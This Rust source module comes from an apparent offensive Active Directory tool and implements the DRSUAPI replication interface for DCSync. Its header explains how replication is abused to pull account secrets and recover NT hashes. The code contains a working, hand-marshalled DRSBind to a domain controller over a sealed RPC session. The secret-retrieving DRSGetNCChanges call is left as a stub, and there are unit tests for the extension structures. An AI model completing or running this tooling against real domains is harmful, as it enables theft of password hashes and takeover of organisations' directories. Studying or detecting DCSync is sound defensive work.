//! DRSUAPI (MS-DRSR) — the directory replication interface used for DCSync.
//!
//! DCSync abuses replication: bind to DRSUAPI over a sign+sealed ncacn_ip_tcp channel
//! (`DRSBind`), then request a single object's secrets with `DRSGetNCChanges`
//! (EXOP_REPL_OBJ). The reply carries the account's attributes with the secrets encrypted
//! under the NTLM session key; a per-RID DES pass then recovers the NT hash.
//!
//! This module marshals the DRS structures by hand on top of [`crate::ndr`]. `DRSBind` is
//! implemented and validated live; `DRSGetNCChanges` builds on the same primitives.

use crate::ndr::{NdrDecoder, NdrEncoder};
use crate::transport::RpcTcp;
use crate::{epm, Result, RpcError, Syntax};
use adhammer_core::sid::Sid;
use adhammer_core::Guid;

/// DRSUAPI interface: e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0.
pub fn drsuapi_syntax() -> Syntax {
    Syntax::new("e3514235-4b06-11d1-ab04-00c04fc2dcd2", 4, 0)
}

/// NTDSAPI client GUID (the well-known value every DRS client presents).
const NTDSAPI_CLIENT_GUID: &str = "e24d201a-4fd6-11d1-a3da-0000f875ae0d";

pub mod opnum {
    pub const DRS_BIND: u16 = 0;
    pub const DRS_GET_NC_CHANGES: u16 = 3;
}

// DRS_EXTENSIONS_INT dwFlags bits we advertise — enough for a V8 request / V6 reply with
// strong (session-key) encryption of the returned secrets.
const DRS_EXT_BASE: u32 = 0x0000_0001;
const DRS_EXT_STRONG_ENCRYPTION: u32 = 0x0000_8000;
const DRS_EXT_GETCHGREQ_V8: u32 = 0x0100_0000;
const DRS_EXT_GETCHGREPLY_V6: u32 = 0x0400_0000;

/// Build the DRS_EXTENSIONS_INT rgb payload (the bytes that follow `cb`).
fn drs_extensions_rgb() -> Vec<u8> {
    let mut v = Vec::new();
    let flags = DRS_EXT_BASE | DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_GETCHGREQ_V8 | DRS_EXT_GETCHGREPLY_V6;
    v.extend_from_slice(&flags.to_le_bytes()); // dwFlags
    v.extend_from_slice(&[0u8; 16]); // SiteObjGuid
    v.extend_from_slice(&0u32.to_le_bytes()); // Pid
    v.extend_from_slice(&0u32.to_le_bytes()); // dwReplEpoch
    v.extend_from_slice(&0u32.to_le_bytes()); // dwFlagsExt
    v.extend_from_slice(&[0u8; 16]); // ConfigObjGUID
    v.extend_from_slice(&0xffff_ffffu32.to_le_bytes()); // dwExtCaps
    v
}

/// An established DRS session: the sealed RPC connection plus the server-returned handle.
pub struct DrsSession {
    rpc: RpcTcp,
    handle: [u8; 20],
}

impl DrsSession {
    /// Resolve DRSUAPI's dynamic port via the endpoint mapper, open a sign+sealed session,
    /// and `DRSBind` to obtain the replication handle.
    pub async fn bind(
        host: &str,
        domain: &str,
        user: &str,
        password: &str,
    ) -> Result<Self> {
        let port = epm::resolve_port(host, drsuapi_syntax()).await?;
        let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
        rpc.bind_sealed(drsuapi_syntax(), domain, user, password, "ADHAMMER").await?;

        // IDL_DRSBind(puuidClientDsa [unique], pextClient [unique]) → (ppextServer, phDrs, ret)
        let mut e = NdrEncoder::new();
        e.referent(); // puuidClientDsa: non-null unique pointer
        e.uuid(&Guid::parse(NTDSAPI_CLIENT_GUID).expect("client GUID").0);
        e.referent(); // pextClient: non-null unique pointer to DRS_EXTENSIONS
        let rgb = drs_extensions_rgb();
        let cb = rgb.len() as u32;
        e.u32(cb); // conformant max_count (rgb is [size_is(cb)])
        e.u32(cb); // cb
        e.bytes(&rgb);
        while e.len() % 4 != 0 {
            e.u8(0);
        }
        let resp = rpc.call_sealed(opnum::DRS_BIND, &e.into_bytes()).await?;

        // Reply: ppextServer [ref] → DRS_EXTENSIONS, phDrs (20-byte context handle), retval.
        let mut d = NdrDecoder::new(&resp);
        let _server_ext_ref = d.u32()?;
        let _max = d.u32()?;
        let server_cb = d.u32()? as usize;
        let _server_rgb = d.read_bytes(server_cb)?;
        while d.position() % 4 != 0 {
            d.u8()?;
        }
        let handle: [u8; 20] = d.read_bytes(20)?.try_into().unwrap();
        let retval = d.u32().unwrap_or(0);
        if retval != 0 {
            return Err(RpcError::Protocol(format!("DRSBind failed: 0x{retval:08x}")));
        }
        Ok(DrsSession { rpc, handle })
    }

    pub fn handle(&self) -> &[u8; 20] {
        &self.handle
    }

    /// Placeholder for the DRSGetNCChanges call (next step).
    pub async fn get_nc_changes(&mut self, _target_dn: &str, _target_sid: &Sid) -> Result<Vec<u8>> {
        let _ = &mut self.rpc;
        Err(RpcError::Protocol("DRSGetNCChanges not yet implemented".into()))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extensions_rgb_shape() {
        let rgb = drs_extensions_rgb();
        assert_eq!(rgb.len(), 52); // dwFlags+SiteObjGuid+Pid+ReplEpoch+FlagsExt+ConfigObjGUID+ExtCaps
        let flags = u32::from_le_bytes(rgb[0..4].try_into().unwrap());
        assert_eq!(flags & DRS_EXT_GETCHGREPLY_V6, DRS_EXT_GETCHGREPLY_V6);
        assert_eq!(flags & DRS_EXT_STRONG_ENCRYPTION, DRS_EXT_STRONG_ENCRYPTION);
    }

    #[test]
    fn syntax_uuid_parses() {
        let s = drsuapi_syntax();
        assert_eq!(s.ver_major, 4);
        assert_ne!(s.uuid, [0u8; 16]);
    }
}
